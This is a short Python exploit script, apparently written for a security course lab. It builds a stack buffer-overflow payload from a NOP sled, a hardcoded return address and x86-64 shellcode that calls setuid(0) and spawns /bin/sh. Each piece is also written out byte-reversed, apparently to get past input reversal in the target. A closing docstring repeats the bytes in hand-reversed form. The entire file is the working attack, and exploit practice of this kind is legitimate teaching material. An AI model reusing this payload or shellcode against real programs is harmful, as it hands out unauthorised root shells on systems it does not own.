#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    #assert isinstance(v, bytes)
    #sys.stdout.flush()
    sys.stdout.buffer.write(v)
    #sys.stdout.flush()

def writeLong(v): #KANSKE TA BORT GREJER ??? ---------------------------
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
#def eprint(*args, **kwargs):
#    print(*args, file=sys.stderr, **kwargs)

# read shellscript as bytestring, use writeBytes(payload) to write it out

payload = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
rev_payload = payload[::-1]

#address = writeLong(140737488348000)    #7f ff ff ff e2 d8

address = b"\xd8\xe2\xff\xff\xff\x7f" #6   #e31f

rev_address = address[::-1]

nop = b"\x90"*25
nop1 = b"\x90"
rev_nop = nop[::-1]

print(len(rev_address+nop+payload+rev_payload+rev_nop+address))

#print(f"Payload: {payload} Adress: {address} RevNop: {rev_nop} Nop: {nop}")
#writeBytes(total)


writeBytes(rev_address)
writeBytes(nop)
writeBytes(payload)
writeBytes(rev_payload)
writeBytes(rev_nop)
writeBytes(address)

"""

addr = \x7f\xff\xff\xff\xe3\x60
rev addr = 06x\3ex\ffx\ffx\ffx\f7x\
24x NOP = \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\
rev NOP = 09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\09x\
shellcode 77 = \x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05
rev sh = 50x\f0x\85x\c3x\a6x\f5x\10x\a6x\50x\f0x\b3x\0bx\6ex\98x\84x\75x\05x\0cx\13x\84x\7ex\98x\84x\35x\80x\bex\1cx\84x\86x\37x\f2x\e6x\96x\26x\f2x\ffx\bbx\84x\2dx\13x\84x\50x\f0x\96x\0bx\ffx\13x\84x\
"""